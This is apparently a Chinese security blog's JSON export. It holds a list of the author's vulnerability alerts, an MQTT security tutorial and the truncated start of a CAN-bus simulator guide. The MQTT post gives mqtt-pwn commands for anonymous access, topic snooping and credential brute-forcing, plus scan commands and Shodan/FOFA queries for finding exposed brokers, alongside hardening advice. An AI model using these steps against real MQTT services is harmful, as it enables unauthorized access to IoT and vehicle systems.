href=\&#34;https://nosec.org/home/detail/1541.html\&#34;&gt;【漏洞预警】多款无线AP设备存在任意文件读取漏洞&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;https://nosec.org/home/detail/1495.html\&#34;&gt;Shadow Brokers公布NSA黑客工具_包含众多Windows 0day漏洞&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;https://nosec.org/home/detail/1497.html\&#34;&gt;【漏洞预警】Jenkins未验证代码执行_CVE-2017-1000353&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;https://nosec.org/home/detail/1367.html\&#34;&gt;Jmoola! cms core最新任意文件上传漏洞&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;https://nosec.org/home/detail/1380.html\&#34;&gt;PhpMailer存在远程代码执行漏洞&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;https://nosec.org/home/detail/1381.html\&#34;&gt;【漏洞预警】PhpMailer存在任意代码执行漏洞补丁绕过(0day)&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;https://nosec.org/home/detail/1397.html\&#34;&gt;【漏洞预警】Wordpress 内容注入漏洞&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;https://nosec.org/home/detail/1617.html\&#34;&gt;【威胁预警】Redis挖矿病毒预警&lt;/a&gt;&lt;/li&gt;\n&lt;/ol&gt;\n&#34;,&#34;fileName&#34;:&#34;my-some-vulnerability-alert&#34;,&#34;abstract&#34;:&#34;&lt;p&gt;前几年做的一些漏洞分析复现或预警的文章，后来做管理岗，仅对感兴趣的漏洞做分析，写文写的少了。今天整理了下，存个档。&lt;br&gt;\n注：由于国家政策限制，有一些只对外发了预警，详细的版本均发送给了监管机构。有一些访问404的是因为不方便公开细节。对于0day申请了cve编号，详情都发在sec-list。&lt;/p&gt;\n&lt;ol&gt;\n&lt;li&gt;&lt;a href=\&#34;https://nosec.org/home/detail/1543.html\&#34;&gt;【漏洞预警】pixie 在线图片编辑器全版本存在SSRF漏洞[0day]&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;https://nosec.org/home/detail/1555.html\&#34;&gt;【漏洞预警】Onethink 全版本SSRF漏洞[0day]&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;https://nosec.org/home/detail/1542.html\&#34;&gt;【漏洞预警】Struts2 最新命令执行漏洞S2-052[最新更新，PoC,漏洞绕过]&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;https://nosec.org/home/detail/1544.html\&#34;&gt;Cockpit CMS SSRF漏洞 0day&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;https://nosec.org/home/detail/1545.html\&#34;&gt;TPSHOP 多用户商城系统任意文件读取&amp;amp;&amp;amp;SSRF 0day&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;https://nosec.org/home/detail/1559.html\&#34;&gt;【漏洞预警】Metinfo 5.3.5- 5.3.13 SSRF漏洞[0day]&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;https://nosec.org/home/detail/1517.html\&#34;&gt;【漏洞预警】Metinfo 5.x.x版本 SQL注入漏洞&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;https://nosec.org/home/detail/1384.html\&#34;&gt;威胁情报预警：Elasticsearch勒索软件事件&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;https://nosec.org/home/detail/1389.html\&#34;&gt;威胁情报预警：Couchdb勒索事件&lt;/a&gt;&lt;/li&gt;\n&lt;/ol&gt;\n&#34;,&#34;title&#34;:&#34;自己的一些漏洞分析文章汇总【含0day】&#34;,&#34;tags&#34;:[{&#34;name&#34;:&#34;漏洞预警&#34;,&#34;slug&#34;:&#34;h4yheh3j6Qx&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/h4yheh3j6Qx/&#34;},{&#34;name&#34;:&#34;漏洞分析&#34;,&#34;slug&#34;:&#34;JFK_sot7whC&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/JFK_sot7whC/&#34;},{&#34;name&#34;:&#34;0day&#34;,&#34;slug&#34;:&#34;9Gfks6A0gy7&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/9Gfks6A0gy7/&#34;}],&#34;date&#34;:&#34;2020-08-23 09:04:27&#34;,&#34;dateFormat&#34;:&#34;2020-08-23&#34;,&#34;feature&#34;:&#34;&#34;,&#34;link&#34;:&#34;https://bacde.me/post/my-some-vulnerability-alert/&#34;,&#34;hideInList&#34;:false,&#34;isTop&#34;:false,&#34;stats&#34;:{&#34;text&#34;:&#34;4 min read&#34;,&#34;time&#34;:190000,&#34;words&#34;:824,&#34;minutes&#34;:4},&#34;description&#34;:&#34;前几年做的一些漏洞分析复现或预警的文章，后来做管理岗，仅对感兴趣的漏洞做分析，写文写的少了。今天整理了下，存个档。\n注：由于国家政策限制，有一些只对外发了预警，详细的版本均发送给了监管机构。有一些访问404的是因为不方便公开细节。对于0da...&#34;,&#34;toc&#34;:&#34;&#34;},{&#34;content&#34;:&#34;&lt;p&gt;MQTT 全称为 Message Queuing Telemetry Transport（消息队列遥测传输）是是ISO 标准(ISO/IEC PRF 20922)下基于发布/订阅范式的消息协议，由 IBM 发布。由于其轻量、简单、开放和易于实现的特点非常适合需要低功耗和网络带宽有限的IoT场景。比如遥感数据、汽车、智能家居、智慧城市、医疗医护等。&lt;/p&gt;\n&lt;h2 id=\&#34;mqtt协议\&#34;&gt;MQTT协议&lt;/h2&gt;\n&lt;p&gt;MQTT协议为大量计算能力有限，低带宽、不可靠网络等环境而设计，其应用非常广泛。目前支持的服务端程序也较丰富，其PHP，JAVA，Python，C，C#等系统语言也都可以向MQTT发送相关消息。 目前最新的版本为5.0版本，可以在https://github.com/mqtt/mqtt.github.io/wiki/servers   这个连接中看到支持MQTT的服务端软件。 其中hivemq中提到针对汽车厂商的合作与应用，在研究过程中会发现有汽车行业应用了MQTT协议。&lt;/p&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;1\&#34;&gt;&lt;img src=\&#34;https://p1.ssl.qhimg.com/t01f74a80563218bc7a.png\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&lt;p&gt;以下列举我们关心的几项：&lt;/p&gt;\n&lt;ol&gt;\n&lt;li&gt;使用发布/订阅的消息模式，支持一对多的消息发布；&lt;/li&gt;\n&lt;li&gt;消息是通过TCP/IP协议传输；&lt;/li&gt;\n&lt;li&gt;简单的数据包格式；&lt;/li&gt;\n&lt;li&gt;默认端口为TCP的1883，websocket端口8083，默认消息不加密。8883端口默认是通过TLS加密的MQTT协议。&lt;/li&gt;\n&lt;/ol&gt;\n&lt;!-- more --&gt;\n&lt;h3 id=\&#34;发布订阅模式\&#34;&gt;发布/订阅模式&lt;/h3&gt;\n&lt;p&gt;MQTT协议中有三种角色和一个主要概念，三种角色分别是发布者（PUBLISHER）、订阅者（SUBCRIBER）、代理（BROKER），还有一个主要的概念为主题（TOPIC）。&lt;/p&gt;\n&lt;p&gt;消息的发送方被称为发布者，消息的接收方被称为订阅者，发送者和订阅者发布或订阅消息均会连接BROKER，BROKER一般为服务端，BROKER存放消息的容器就是主题。发布者将消息发送到主题中，订阅者在接收消息之前需要先“订阅主题”。每份订阅中，订阅者都可以接收到主题的所有消息。&lt;/p&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;2\&#34;&gt;&lt;img src=\&#34;https://p0.ssl.qhimg.com/t01b3844d8b306b3f7c.jpg\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&lt;p&gt;其MQTT协议流程图如下： &lt;img src=\&#34;https://p1.ssl.qhimg.com/t01c8644cc806e6316e.png\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/p&gt;\n&lt;p&gt;这里不对协议进行过多介绍，感兴趣的大家可以结尾处的引用查看。&lt;/p&gt;\n&lt;h2 id=\&#34;mqtt的攻击点\&#34;&gt;MQTT的攻击点&lt;/h2&gt;\n&lt;p&gt;根据其特性，可以扩展如下几个攻击点：&lt;/p&gt;\n&lt;ol&gt;\n&lt;li&gt;授权：匿名连接问题，匿名访问则代表任何人都可以发布或订阅消息。如果存在敏感数据或指令，将导致信息泄漏或者被恶意攻击者发起恶意指令；&lt;/li&gt;\n&lt;li&gt;传输：默认未加密，则可被中间人攻击。可获取其验证的用户名和密码；&lt;/li&gt;\n&lt;li&gt;认证：弱口令问题，由于可被爆破，设置了弱口令，同样也会存在安全风险；&lt;/li&gt;\n&lt;li&gt;应用：订阅端明文配置导致泄漏其验证的用户名和密码；&lt;/li&gt;\n&lt;li&gt;漏洞：服务端软件自身存在缺陷可被利用，或者订阅端或服务端解析内容不当产生安全漏洞，这将导致整个系统。&lt;/li&gt;\n&lt;/ol&gt;\n&lt;h3 id=\&#34;mqtt的利用\&#34;&gt;MQTT的利用&lt;/h3&gt;\n&lt;p&gt;目前已经有针对MQTT的开源利用工具，这里主要以mqtt-pwn这块工具为主。mqtt-pwn这块工具功能强大易用。github地址为&lt;a href=\&#34;https://github.com/akamai-threat-research/mqtt-pwn\&#34;&gt;https://github.com/akamai-threat-research/mqtt-pwn&lt;/a&gt;，使用文档地址为&lt;a href=\&#34;https://mqtt-pwn.readthedocs.io/en/latest/\&#34;&gt;https://mqtt-pwn.readthedocs.io/en/latest/&lt;/a&gt;。&lt;/p&gt;\n&lt;p&gt;&lt;strong&gt;工具安装&lt;/strong&gt;&lt;br&gt;\nmqtt-pwn的安装很简单。可以直接安装到本机，也可以直接使用docker的方式。&lt;br&gt;\n文本直接使用docker方式。首先确保已经安装docker和docker-compose。然后运行如下命令进行安装:&lt;/p&gt;\n&lt;pre&gt;&lt;code&gt;git clone https://github.com/akamai-threat-research/mqtt-pwn.git\ncd mqtt-pwn\ndocker-compose up --build --detach\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;运行：&lt;/p&gt;\n&lt;pre&gt;&lt;code&gt;docker-compose ps\ndocker-compose run cli\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;即可看到mqtt-pwn的界面。&lt;br&gt;\n&lt;img src=\&#34;https://p2.ssl.qhimg.com/t0145aba7cf70a0a690.png\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/p&gt;\n&lt;p&gt;&lt;strong&gt;MQTT匿名访问&lt;/strong&gt;&lt;br&gt;\n有一些MQTT的服务端软件默认是开启匿名访问，如果管理员没有网络安全意识或懒惰，只要对公网开放，任何人都可以直接访问。&lt;/p&gt;\n&lt;p&gt;使用mqtt-pwn的connect命令进行连接。&lt;code&gt;connect -h&lt;/code&gt; 显示帮助信息，其他命令也是如此，使用时，多看帮助和文档，很快就可以熟悉使用。&lt;br&gt;\n对于开启匿名的服务，直接&lt;code&gt;connect -o host&lt;/code&gt; 即可，当然该命令也支持输入用户名和密码。如果没有显示连接异常，就表示连接成功。连接成功后，可使用&lt;code&gt;system_info&lt;/code&gt; 查看系统信息。&lt;/p&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;3\&#34;&gt;&lt;img src=\&#34;https://p4.ssl.qhimg.com/t01287faaad96ebfc43.png\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&lt;p&gt;接下来就可以查看topic信息等内容。这时先执行&lt;code&gt;discovery&lt;/code&gt;，等待显示scan  #1 has finished，接下来执行&lt;code&gt;scans -i 序号&lt;/code&gt;，在执行&lt;code&gt;topics&lt;/code&gt;命令即可看到topic信息。 其中&lt;code&gt;disconvery&lt;/code&gt;可以使用&lt;code&gt;-t&lt;/code&gt;参数设置超时时间。&lt;code&gt;topics&lt;/code&gt;命令可以使用&lt;code&gt;-l&lt;/code&gt;参数设置查看条数。&lt;/p&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;4\&#34;&gt;&lt;img src=\&#34;https://p5.ssl.qhimg.com/t0178206285c0ae4785.png\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&lt;p&gt;可以输入&lt;code&gt;messages&lt;/code&gt;查看topic的内容。使用&lt;code&gt;-l&lt;/code&gt;限制条数，&lt;code&gt;-i&lt;/code&gt;参数查看某个单挑消息内容等。&lt;br&gt;\n&lt;img src=\&#34;https://p3.ssl.qhimg.com/t0160bb2c89e37fa7c6.png\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/p&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;5\&#34;&gt;&lt;img src=\&#34;https://p5.ssl.qhimg.com/t016e010021b6700142.png\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&lt;p&gt;&lt;strong&gt;MQTT用户名密码爆破&lt;/strong&gt;&lt;br&gt;\nmetasploit带有MQTT的爆破模块，经过实际测试，效果并不理想。这里仍然以mqtt-pwn来进行介绍。&lt;br&gt;\nmqtt-pwn具有bruteforce功能，并带了一个简单的字典，可以爆破MQTT的用户名和密码。&lt;/p&gt;\n&lt;pre&gt;&lt;code&gt;bruteforce --host host --port -uf user_dic -pf pass_dic \n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;端口默认是1883，用户和密码字典默认会在mqtt-pwn的&lt;code&gt;resources/wordlists&lt;/code&gt; 文件夹下。&lt;/p&gt;\n&lt;p&gt;例如执行&lt;code&gt;bruteforce --host 127.0.0.1&lt;/code&gt;爆破。爆破成功后就可以使用上面将到的内容进行连接进行操作，在连接时加上用户名和密码选项即可。&lt;/p&gt;\n&lt;p&gt;mqtt-pwn还支持更多功能，如&lt;a href=\&#34;https://mqtt-pwn.readthedocs.io/en/latest/plugins/owntracks.html\&#34;&gt;Owntracks (GPS Tracker)&lt;/a&gt;、&lt;a href=\&#34;https://mqtt-pwn.readthedocs.io/en/latest/plugins/sonoff.html\&#34;&gt;Sonoff Exploiter&lt;/a&gt;等。感兴趣的大家自己去看下文档去进行测试。&lt;/p&gt;\n&lt;p&gt;&lt;strong&gt;应用中发现&lt;/strong&gt;&lt;br&gt;\n在实际的使用场景我们可以通过中间人劫持从流量中捕获验证信息。以下为wireshark抓包内容。&lt;br&gt;\n&lt;img src=\&#34;https://p5.ssl.qhimg.com/t014090f26a582af519.png\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/p&gt;\n&lt;p&gt;除此之外，由于目前多种语言实现了mqtt的客户端，web应用中还有webscoket的mqtt。这使得可以通过web的网页源码或网络请求获得验证的信息。&lt;/p&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;6\&#34;&gt;&lt;img src=\&#34;https://p5.ssl.qhimg.com/t01c3af2e34139f7a84.png\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&lt;p&gt;&lt;strong&gt;服务端漏洞&lt;/strong&gt;&lt;br&gt;\n这里列举一些历史上MQTT的漏洞供参考。&lt;/p&gt;\n&lt;ol&gt;\n&lt;li&gt;&lt;a href=\&#34;https://www.cvedetails.com/cve/CVE-2017-7296/\&#34;&gt;CVE-2017-7296&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;https://mosquitto.org/blog/2017/05/security-advisory-cve-2017-7650/\&#34;&gt;CVE-2017-7650&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;https://nvd.nist.gov/vuln/detail/CVE-2018-17614\&#34;&gt;CVE-2018-17614&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;https://hackerone.com/reports/541354\&#34;&gt;CVE-2019-5432&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;https://nvd.nist.gov/vuln/detail/CVE-2020-13849\&#34;&gt;CVE-2020-13849&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;https://mosquitto.org/security/\&#34;&gt;Mosquitto漏洞列表&lt;/a&gt;&lt;/li&gt;\n&lt;/ol&gt;\n&lt;h2 id=\&#34;探测与发现\&#34;&gt;探测与发现&lt;/h2&gt;\n&lt;p&gt;功能强大的nmap是支持MQTT协议的识别的，可以直接通过nmap进行识别MQTT协议。另外，除上面提到的默认端口外，有的管理员会修改默认端口，这时也可以尝试1884，8084，8884等临近端口以进行快速探测，或前面增加数字等作为组合，如果针对单个目标，则可以探测全部端口。如果进行大规模的扫描或者提升扫描效率，则可以使用masscan、zmap、RustScan等先进性端口扫描，在使用nmap进行协议识别即可。&lt;br&gt;\nnmap举例命令如下：&lt;br&gt;\n&lt;code&gt;sudo nmap -p1883,8083,8883 -sS -sV --version-intensity 9 -Pn --open target_ip&lt;/code&gt;&lt;/p&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;7\&#34;&gt;&lt;img src=\&#34;https://p3.ssl.qhimg.com/t018117aa19a2c9274f.png\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&lt;p&gt;nmap也有相关的MQTT lua脚本可以使用，其MQTT版本为3.1.1。脚本地址为&lt;a href=\&#34;https://svn.nmap.org/nmap/nselib/mqtt.lua\&#34;&gt;https://svn.nmap.org/nmap/nselib/mqtt.lua&lt;/a&gt;。&lt;/p&gt;\n&lt;p&gt;如果想要自己编写代码去进行探测，只需要根据MQTT的协议标准，通过socket即可进行收发报文。关于MQTT协议的详细内容可以查看文档，地址为&lt;a href=\&#34;https://docs.oasis-open.org/mqtt/mqtt/\&#34;&gt;https://docs.oasis-open.org/mqtt/mqtt/&lt;/a&gt;&lt;/p&gt;\n&lt;p&gt;现有的网络空间测绘平台基本都实现了对MQTT进行探测。可直接通过这些搜索引擎获取大量对外使用MQTT协议的服务。&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;\n&lt;p&gt;知风&lt;br&gt;\n在针对IoT和ICS探测的搜索引擎知风中搜索，直接搜索&lt;code&gt;mqtt&lt;/code&gt;关键字，可以发现15万个对外开放的服务。&lt;br&gt;\n&lt;img src=\&#34;https://p1.ssl.qhimg.com/t01e5819f5a7da4e34c.png\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/p&gt;\n&lt;/li&gt;\n&lt;li&gt;\n&lt;p&gt;fofa&lt;br&gt;\n搜索关键字为&lt;code&gt;protocol=mqtt&lt;/code&gt;，一年内有25万个对外开放。&lt;/p&gt;\n&lt;/li&gt;\n&lt;/ul&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;8\&#34;&gt;&lt;img src=\&#34;https://p2.ssl.qhimg.com/t0137efdf7d38a450f0.png\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&lt;ul&gt;\n&lt;li&gt;shodan&lt;br&gt;\n搜索关键字：&lt;br&gt;\nproduct:&amp;quot;MQTT&amp;quot;&lt;br&gt;\nproduct:&amp;quot;Mosquitto&amp;quot;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;p&gt;shodan上搜索后共有超过11万个对外开放。&lt;/p&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;9\&#34;&gt;&lt;img src=\&#34;https://p5.ssl.qhimg.com/t0146755084862cf215.png\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&lt;p&gt;通过以上的搜索结果，各引擎各有优劣。shodan和知风针对该协议的探测均会列出topic；而fofa从发现数量上最多，但是仅识别了协议，并未列出topic；除此之外知风系统的地理位置定位精度较高，可以定位百米范围内。&lt;/p&gt;\n&lt;h2 id=\&#34;mqtt-安全建议\&#34;&gt;mqtt 安全建议&lt;/h2&gt;\n&lt;ol&gt;\n&lt;li&gt;请勿启用匿名访问，对服务端（BROKER）设置认证，增加用户名密码验证。&lt;/li&gt;\n&lt;li&gt;根据实际情况，优先使用加密传输数据，防止中间人攻击。&lt;/li&gt;\n&lt;li&gt;加密payload后在进行安全传输。&lt;/li&gt;\n&lt;li&gt;使用最新的服务端程序架设服务。&lt;/li&gt;\n&lt;li&gt;不要将实现的代码上传到github等代码公开平台。&lt;/li&gt;\n&lt;/ol&gt;\n&lt;h2 id=\&#34;小结\&#34;&gt;小结&lt;/h2&gt;\n&lt;p&gt;写这篇文章时，网络上关于MQTT安全的文章并不多，但是通过对其了解，仍然有不少内容可以探索，比如在工业上有MQTT网关，以及众多支持MQTT的服务端软件、加上广泛的应用场景。本文简单介绍MQTT安全的内容，还有更多的内容等待探索。感兴趣的朋友也欢迎大家多多交流讨论。&lt;/p&gt;\n&lt;p&gt;最后，提醒一下大家，在学习和研究过程中自己搭建服务进行学习。请勿对网络上的目标进行测试、破坏等活动。&lt;/p&gt;\n&lt;h2 id=\&#34;引用\&#34;&gt;引用&lt;/h2&gt;\n&lt;p&gt;https://dzone.com/articles/exploiting-mqtt-using-lua&lt;br&gt;\nhttps://www.hindawi.com/journals/wcmc/2018/8261746/&lt;br&gt;\nhttps://github.com/akamai-threat-research/mqtt-pwn&lt;br&gt;\nhttps://morphuslabs.com/hacking-the-iot-with-mqtt-8edaf0d07b9b&lt;br&gt;\nhttps://book.hacktricks.xyz/pentesting/1883-pentesting-mqtt-mosquitto&lt;br&gt;\nhttps://hackmd.io/@QwmL8PAwTx-bYDnry-ONpA/H1nm2tHzb?type=view&lt;br&gt;\nhttps://ttm4175.iik.ntnu.no/prep-iot-mqtt.html&lt;br&gt;\nhttps://mobilebit.wordpress.com/tag/mqtt/&lt;br&gt;\nhttps://www.hivemq.com/blog/seven-best-mqtt-client-tools/&lt;br&gt;\nhttps://nmap.org/nsedoc/lib/mqtt.html&lt;br&gt;\nhttp://mqtt.p2hp.com/&lt;/p&gt;\n&#34;,&#34;fileName&#34;:&#34;mqtt-security-part-one&#34;,&#34;abstract&#34;:&#34;&lt;p&gt;MQTT 全称为 Message Queuing Telemetry Transport（消息队列遥测传输）是是ISO 标准(ISO/IEC PRF 20922)下基于发布/订阅范式的消息协议，由 IBM 发布。由于其轻量、简单、开放和易于实现的特点非常适合需要低功耗和网络带宽有限的IoT场景。比如遥感数据、汽车、智能家居、智慧城市、医疗医护等。&lt;/p&gt;\n&lt;h2 id=\&#34;mqtt协议\&#34;&gt;MQTT协议&lt;/h2&gt;\n&lt;p&gt;MQTT协议为大量计算能力有限，低带宽、不可靠网络等环境而设计，其应用非常广泛。目前支持的服务端程序也较丰富，其PHP，JAVA，Python，C，C#等系统语言也都可以向MQTT发送相关消息。 目前最新的版本为5.0版本，可以在https://github.com/mqtt/mqtt.github.io/wiki/servers   这个连接中看到支持MQTT的服务端软件。 其中hivemq中提到针对汽车厂商的合作与应用，在研究过程中会发现有汽车行业应用了MQTT协议。&lt;/p&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;1\&#34;&gt;&lt;img src=\&#34;https://p1.ssl.qhimg.com/t01f74a80563218bc7a.png\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&lt;p&gt;以下列举我们关心的几项：&lt;/p&gt;\n&lt;ol&gt;\n&lt;li&gt;使用发布/订阅的消息模式，支持一对多的消息发布；&lt;/li&gt;\n&lt;li&gt;消息是通过TCP/IP协议传输；&lt;/li&gt;\n&lt;li&gt;简单的数据包格式；&lt;/li&gt;\n&lt;li&gt;默认端口为TCP的1883，websocket端口8083，默认消息不加密。8883端口默认是通过TLS加密的MQTT协议。&lt;/li&gt;\n&lt;/ol&gt;\n&#34;,&#34;title&#34;:&#34;物联网安全之MQTT协议安全&#34;,&#34;tags&#34;:[{&#34;name&#34;:&#34;automotive&#34;,&#34;slug&#34;:&#34;prvJjB7Fua5&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/prvJjB7Fua5/&#34;},{&#34;name&#34;:&#34;mqtt&#34;,&#34;slug&#34;:&#34;cu9Tg0uRbMd&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/cu9Tg0uRbMd/&#34;},{&#34;name&#34;:&#34;car hacking&#34;,&#34;slug&#34;:&#34;JdYDio18R72&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/JdYDio18R72/&#34;},{&#34;name&#34;:&#34;mqtt-pwn&#34;,&#34;slug&#34;:&#34;tCcj-UHo7-S&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/tCcj-UHo7-S/&#34;},{&#34;name&#34;:&#34;car&#34;,&#34;slug&#34;:&#34;NB7AfDzqlwN&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/NB7AfDzqlwN/&#34;}],&#34;date&#34;:&#34;2020-08-18 22:29:08&#34;,&#34;dateFormat&#34;:&#34;2020-08-18&#34;,&#34;feature&#34;:&#34;&#34;,&#34;link&#34;:&#34;https://bacde.me/post/mqtt-security-part-one/&#34;,&#34;hideInList&#34;:false,&#34;isTop&#34;:false,&#34;stats&#34;:{&#34;text&#34;:&#34;9 min read&#34;,&#34;time&#34;:530000,&#34;words&#34;:2351,&#34;minutes&#34;:9},&#34;description&#34;:&#34;MQTT 全称为 Message Queuing Telemetry Transport（消息队列遥测传输）是是ISO 标准(ISO/IEC PRF 20922)下基于发布/订阅范式的消息协议，由 IBM 发布。由于其轻量、简单、开放和易于...&#34;,&#34;toc&#34;:&#34;&lt;ul class=\&#34;markdownIt-TOC\&#34;&gt;\n&lt;li&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=\&#34;#mqtt%E5%8D%8F%E8%AE%AE\&#34;&gt;MQTT协议&lt;/a&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E5%8F%91%E5%B8%83%E8%AE%A2%E9%98%85%E6%A8%A1%E5%BC%8F\&#34;&gt;发布/订阅模式&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#mqtt%E7%9A%84%E6%94%BB%E5%87%BB%E7%82%B9\&#34;&gt;MQTT的攻击点&lt;/a&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=\&#34;#mqtt%E7%9A%84%E5%88%A9%E7%94%A8\&#34;&gt;MQTT的利用&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E6%8E%A2%E6%B5%8B%E4%B8%8E%E5%8F%91%E7%8E%B0\&#34;&gt;探测与发现&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#mqtt-%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%AE\&#34;&gt;mqtt 安全建议&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E5%B0%8F%E7%BB%93\&#34;&gt;小结&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E5%BC%95%E7%94%A8\&#34;&gt;引用&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;/ul&gt;\n&#34;},{&#34;content&#34;:&#34;&lt;p&gt;本文主要是通过ICSim(Instrument Cluster Simulator)模拟CAN协议通信，通过实践对CAN总线协议进行逆向分析。在实践过程中踩过一些坑，这里跟大家分享交流。&lt;/p&gt;\n&lt;h2 id=\&#34;简介\&#34;&gt;简介&lt;/h2&gt;\n&lt;p&gt;CAN(Controller Area Network)总线是制造业和汽车产业中使用的一种简单协议，为ISO国际标准化的串行通信协议。在现代汽车中的小型嵌入式系统和ECU能够使用CAN协议进行通信，其通信是采用的广播机制，与TCP协议中的UDP差不多。各个系统或ECU（电子控制单元）都可以收发控制消息。1996年起该协议成了美国轿车和轻型卡车的标准协议之一，但是直到2008年才成为强制标准（2001年成为欧洲汽车标准）。当然1996年之前的也有可能使用CAN总线。现在，汽车的电子组件均通过CAN总线连接，针对汽车的攻击最终也都会通过CAN总线来实现。对于研究汽车安全，CAN总线协议是必须要掌握的。&lt;/p&gt;\n&lt;!-- more --&gt;\n&lt;h2 id=\&#34;环境与准备\&#34;&gt;环境与准备&lt;/h2&gt;\n&lt;ul&gt;\n&lt;li&gt;CAN总线模拟--ICSim&lt;/li&gt;\n&lt;li&gt;分析工具-- can-utils、Kayak、Wireshark&lt;/li&gt;\n&lt;li&gt;系统--Kali Linux 2020 语言为中文（非root权限）&lt;/li&gt;\n&lt;/ul&gt;\n&lt;h3 id=\&#34;icsim编译\&#34;&gt;ICSim编译&lt;/h3&gt;\n&lt;p&gt;ICSim(Instrument Cluster Simulator)，是由Open Garages推出的工具。它可以产生多个CAN信号，同时会产生许多背景噪声，让我们可以在没有汽车或不改造汽车的情况下即可练习CAN总线的逆向技术。&lt;/p&gt;\n&lt;p&gt;GITHUB地址：&lt;a href=\&#34;https://github.com/zombieCraig/ICSim\&#34;&gt;https://github.com/zombieCraig/ICSim&lt;/a&gt;&lt;/p&gt;\n&lt;p&gt;ICSim目前仅可运行在linux系统下，在Kali linux上按照github提供的安装方法，会出现“libsdl2-dev 未满足的依赖关系”的错误，错误如下图。&lt;br&gt;\n&lt;img src=\&#34;https://p1.ssl.qhimg.com/t0108e075fc23454fc4.png\&#34; alt=\&#34;ICSim安装出错\&#34; title=\&#34;ICSim安装出错\&#34; 